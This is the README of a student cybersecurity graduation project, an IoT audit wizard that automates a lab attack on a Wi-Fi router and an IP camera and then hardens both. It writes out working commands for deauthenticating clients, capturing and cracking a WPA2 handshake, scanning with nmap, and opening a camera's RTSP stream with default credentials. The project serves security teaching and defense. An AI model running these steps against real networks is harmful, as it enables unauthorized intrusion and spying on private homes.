<div align="center">

# ⚡ SmartGuard — IoT Security Audit Framework

**🥇 Winner · 1st Place Graduation Project Award**
Buraydah Colleges · Department of Cybersecurity · 2025 / 2026

[![Language](https://img.shields.io/badge/Shell-Bash-green?style=flat-square&logo=gnubash)](smartguard.sh)
[![GUI](https://img.shields.io/badge/GUI-Python%20%2F%20CustomTkinter-blue?style=flat-square&logo=python)](smartguard_gui.py)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-purple?style=flat-square&logo=kalilinux)](https://www.kali.org)
[![Version](https://img.shields.io/badge/Version-2.0-cyan?style=flat-square)](#)
[![Lab Only](https://img.shields.io/badge/Use-Lab%20Only-red?style=flat-square)](#)

<br>

![SmartGuard GUI](docs/screenshots/smartguard-gui.png)

</div>

---

## 📌 What is SmartGuard?

SmartGuard is a **complete IoT security audit framework** that automates an entire cybersecurity lab from start to finish — replacing manual command-by-command execution with a guided, step-by-step wizard.

It was built as part of our graduation project to demonstrate how **default configurations in IoT devices** (IP cameras, smart locks, smart plugs, and more) expose homes to real-world cyberattacks — and exactly how to fix them.

---

## 🎯 What IoT Devices Can Be Tested?

SmartGuard's methodology applies to **any IoT device connected to Wi-Fi**:

| Device | Common Vulnerability |
|--------|---------------------|
| 📷 IP Cameras (Hikvision, Dahua, etc.) | RTSP stream exposed, default `admin:admin` |
| 🔐 Smart Door Locks | Weak Wi-Fi auth, unencrypted MQTT traffic |
| 💡 Smart Bulbs & Plugs | HTTP control panel on port 80, no auth |
| 📡 Wi-Fi Routers | WPA2 weak passwords, WPS enabled |
| 🌡️ Smart Sensors (temperature, motion) | Telnet open (port 23), no firmware signing |
| 🖨️ Network Printers | Open ports 9100 / 631, no access control |

> In our lab, we used an **IP camera** as the primary target — it represents the worst-case scenario: an attacker gaining visual access to a private home.

---

## 🏗️ Lab Network Topology

```
┌─────────────────────────────────────────────────────────────────────┐
│  BEFORE Hardening                                                    │
│                                                                      │
│  [ Attacker — Kali Linux ]                                           │
│          │                                                           │
│          │  ① Deauth + WPA2 Handshake (aircrack-ng)                  │
│          ▼                                                           │
│  [ Wi-Fi Router ]──────────────[ IP Camera 192.168.8.186 ]          │
│   (password: 12345678)           Port 80  — HTTP admin panel         │
│                                  Port 554 — RTSP live video ← hijack │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│  AFTER Hardening (Defense-in-Depth)                                  │
│                                                                      │
│  [ Attacker ]  ✗ Cannot crack — strong WPA2 password                │
│                ✗ Cannot access — RTSP disabled (port 554 closed)    │
│                ✗ Cannot reach — Camera isolated on IoT VLAN         │
│                ✗ Cannot find  — SSID hidden                         │
└─────────────────────────────────────────────────────────────────────┘
```

---

## ⚡ Attack Methodology — 15-Step Wizard

SmartGuard v2.0 replaces all manual steps with a **guided wizard**. Each step explains what is happening and why before executing the command.

### Phase 01 · Wireless Attack (Steps 1–8)

```
Step 01  Select Wireless Interface         identify your Wi-Fi adapter
Step 02  Kill Interfering Processes        airmon-ng check kill
Step 03  Enable Monitor Mode               airmon-ng start wlan0  →  wlan0mon
Step 04  Scan Surrounding Networks         airodump-ng wlan0mon
Step 05  Set Target (BSSID & Channel)      lock onto the router
Step 06  Start Handshake Capture  ──┐      airodump-ng --bssid ... -w capture
Step 07  Deauth Attack            ──┘  ←  aireplay-ng --deauth 20  (kicks clients)
         [Step 06 captures the handshake the moment clients reconnect]
Step 08  Crack Password                    aircrack-ng + rockyou.txt
```

**Result:** `KEY FOUND! [ 12345678 ]` — cracked in under 30 seconds.

#### Key Command Reference

```bash
# Step 02 — kill interfering processes
sudo airmon-ng check kill

# Step 03 — enable monitor mode
sudo airmon-ng start wlan0

# Step 04 — scan all nearby networks
sudo airodump-ng wlan0mon

# Step 06 — capture handshake (run first, keep running)
sudo airodump-ng --bssid 1E:4A:44:D1:44:4B --channel 6 -w capture wlan0mon

# Step 07 — deauth: kick clients so they reconnect and broadcast the handshake
sudo aireplay-ng --deauth 20 -a 1E:4A:44:D1:44:4B -c FF:FF:FF:FF:FF:FF wlan0mon

# Step 08 — dictionary crack against the captured handshake
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

### Phase 02 · Network Reconnaissance (Steps 9–11)

```
Step 09  Host Discovery     nmap -sn 192.168.8.0/24    → find IP camera
Step 10  Port Scan          nmap -sV -p 80,554,...     → map open services
Step 11  RTSP Hijack        rtsp://admin:admin@192.168.8.186:554/live  → VLC
```

**Open ports found:**

| Port | Service | Risk | Finding |
|------|---------|------|---------|
| 80 | HTTP | 🟡 Medium | Admin panel, no HTTPS, default credentials |
| 554 | RTSP | 🔴 High | Live video stream, unencrypted, no authentication |

```bash
# Step 09 — discover all devices on the LAN
sudo nmap -sn 192.168.8.0/24

# Step 10 — detailed scan on the camera
sudo nmap -sV -p 80,554,8080,443,22,23,21 192.168.8.186

# Step 11 — access live video feed using default credentials
# Open this URL in VLC → Media → Open Network Stream
rtsp://admin:admin@192.168.8.186:554/live
```

---

### Phase 03 · Hardening & Verification (Steps 12–14)

```
Step 12  Apply Hardening Measures    checklist of 5 controls
Step 13  Verify with Nmap            re-scan confirms ports are closed
Step 14  Hardening Score             shows before/after comparison
```

**5 Controls Applied:**

1. **Credential Hardening** — Changed all default passwords (camera + router)
2. **Protocol Disabling** — Disabled RTSP (port 554) on the camera
3. **Network Segmentation** — Moved camera to a dedicated IoT VLAN
4. **Hidden SSID** — IoT network is no longer broadcast
5. **HTTPS Enforcement** — Admin panel now requires encrypted connection

```bash
# Step 13 — verify port 554 is now closed after hardening
sudo nmap -p 554 192.168.8.186
# Expected output: 554/tcp  closed  rtsp
```

---

### Report · Step 15

Generates a full text report saved to disk with all findings, commands, and results.

---

## 📊 Before vs. After

| Security Control | Before Hardening | After Hardening |
|-----------------|-----------------|-----------------|
| Wi-Fi Password | `12345678` — weak | Strong & unique ✅ |
| Camera Credentials | `admin:admin` — default | Changed ✅ |
| Port 554 (RTSP) | Open — video exposed 🔴 | Closed ✅ |
| Port 80 (HTTP) | Open — no HTTPS 🟡 | Restricted ✅ |
| Network | Shared LAN 🔴 | Isolated VLAN ✅ |
| SSID | Publicly broadcast 🟡 | Hidden ✅ |
| **Risk Level** | **HIGH 🔴** | **LOW 🟢** |

> **~80% reduction in attack surface** confirmed by post-hardening nmap scan.

---

## 🖥️ SmartGuard GUI (v2.0)

A full dark-theme desktop application built with Python + CustomTkinter.

**Features:**
- 15-step guided wizard — one screen per step
- Explains *what* and *why* before every command
- Step 06 & 07 work together: capture stays running while deauth fires
- Live progress bar tracking current step
- Terminal-style output with color coding (green = safe, red = vulnerable)
- On **Linux (Kali)** → executes real commands
- On **Windows** → demo/presentation mode with simulated output
- Hardening score calculator with before/after comparison
- Auto-saves session report to text file

### Installation & Run

```bash
# Clone the repository
git clone https://github.com/i39F/IoT-SmartGuard-Security.git
cd IoT-SmartGuard-Security

# Install Python dependencies
pip install customtkinter

# Run the GUI (on Kali Linux use sudo for full functionality)
sudo python3 smartguard_gui.py

# Or run the original Bash CLI version
sudo bash smartguard.sh
```

### Requirements

```bash
# Kali Linux / Debian — install tools
sudo apt update && sudo apt install -y aircrack-ng nmap xterm

# Decompress the wordlist if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 📁 Repository Structure

```
IoT-SmartGuard-Security/
│
├── smartguard_gui.py        # GUI wizard — Python / CustomTkinter (v2.0)
├── smartguard.sh            # CLI framework — Bash (original v1.0)
├── README.md                # This file
│
└── docs/
    └── Graduation_Project_Report.pdf   # Full written report
```

---

## 💡 Suggestions & Future Work

| Idea | Description |
|------|-------------|
| 📱 Mobile App | Android version of the wizard for field audits |
| 🌐 Web Dashboard | Flask-based interface accessible from a browser |
| 🤖 Auto-Target | Auto-detect camera IP from nmap and populate all fields |
| 📄 PDF Report | Export session report as formatted PDF |
| 🔔 Notifications | Alert when handshake is captured (sound / popup) |
| 🔌 WPS Testing | Add WPS PIN attack module (reaver / bully) |
| 📡 Bluetooth IoT | Extend to BLE device scanning (smart locks, wearables) |

---

## 📸 Screenshots

> **Note:** All screenshots below are captured from a controlled lab environment.
> They demonstrate real attack techniques applied to our test device, followed by the hardening measures that eliminated each vulnerability.
> No real networks or private devices were harmed.

---

### 🖥️ SmartGuard GUI — Welcome Screen

![SmartGuard GUI](docs/screenshots/smartguard-gui.png)

The main interface of SmartGuard v2.0. Provides a 15-step guided wizard that walks through the entire audit from wireless attack to hardening verification. Each step explains the concept before executing the command.

---

### 🔌 Step 01 — Select Wireless Interface

![Wizard Step 1](docs/screenshots/wizard-step1.png)

The first step of the wizard. The tool identifies the wireless adapter (e.g. `wlan0`) before putting it into monitor mode. This is required for all subsequent wireless operations.

---

### 📡 Step 06 — Handshake Capture (Running)

![Handshake Capture](docs/screenshots/smartguard-capture.png)

`airodump-ng` is locked onto the target router's BSSID and channel, listening for a WPA2 handshake. The capture runs in the background while Step 07 (Deauth) forces clients to reconnect — triggering the handshake broadcast.

---

### 🔑 Step 08 — Password Cracked

![KEY FOUND](docs/screenshots/key-found.png)

`aircrack-ng` completed a dictionary attack against the captured `.cap` file using `rockyou.txt`.
**Result: `KEY FOUND! [ 12345678 ]`** — the router's weak default password was cracked in seconds.
This gave the attacker full access to the local network and all devices on it.

> **Fix applied:** Router password changed to a strong, randomly generated passphrase.

---

### 🚪 Accessing Camera with Default Credentials

![Default Credentials](docs/screenshots/default-credentials-access.png)

After joining the network, the IP camera was accessed using its factory-default login (`admin` / `admin`). The camera's admin panel and live stream were fully exposed with no authentication barrier.

> **Fix applied:** Default credentials removed. Strong unique password set on the camera.

---

### 🔴 Port Scan — BEFORE Hardening

![Nmap Before](docs/screenshots/nmap-before.png)

`nmap` scan on the IP camera reveals two critical open ports:
- **Port 80 (HTTP)** — admin panel accessible without HTTPS
- **Port 554 (RTSP)** — live video stream exposed to anyone on the network, no authentication required

This is the attack surface before any hardening was applied.

---

### 🟢 Port Scan — AFTER Hardening

![Nmap After](docs/screenshots/nmap-after.png)

The same `nmap` scan after applying the Defense-in-Depth strategy:
- **Port 554** → `closed` — RTSP disabled, video stream no longer accessible
- **Port 80** → `closed` — HTTP management restricted

The attack surface has been eliminated. An attacker who gains LAN access now finds nothing to exploit.

> **What changed:** RTSP disabled in camera settings. Network segmentation applied (IoT VLAN). SSID hidden.

---

### 📊 Session Report

![Report](docs/screenshots/report.png)

SmartGuard auto-generates a full session report at Step 15, summarising all phases: attack findings, hardening checklist results, score, and attack surface reduction percentage. The report is saved as a `.txt` file for documentation.

---

## 👥 Team

| Name | Role |
|------|------|
| Sulaiman Almanea | Team Lead · Attack Phase |
| Muath Alyhya | Wireless Security & Testing |
| Abdulaziz Alharbi | Network Reconnaissance |
| Majed Alghrras | Hardening & Documentation |
| Mansour Alsuwayh | Tool Development & Reporting |

**Supervisor:** Dr. Ahmed Elaraby · Department of Cybersecurity · Buraydah Colleges

---

<div dir="rtl">

## نبذة عن المشروع

**SmartGuard** هو إطار عمل أمني متكامل يُؤتمت عملية اختبار اختراق أجهزة IoT بالكامل — من اختراق شبكة Wi-Fi وصولاً إلى الوصول لبث الكاميرا الحية، ثم تطبيق وتحقق خطة التحصين الأمني.

يستبدل الأداة الطريقة اليدوية (أمر بأمر) بـ **wizard تفاعلي من 15 خطوة** تشرح كل خطوة ماذا تفعل ولماذا قبل تنفيذها.

### الفريق
سليمان المنيع · معاذ اليحيا · عبدالعزيز الحربي · ماجد الغراس · منصور السويه

**المشرف:** د. أحمد العرابي · قسم الأمن السيبراني · كليات بريدة

> ⚠️ للاستخدام في بيئات المختبر المُخوَّلة فقط.

</div>

---

<div align="center">

**Buraydah Colleges · Cybersecurity Department · Final Year Project 2025/2026**

*"From default credentials to zero trust — one step at a time."*

</div>
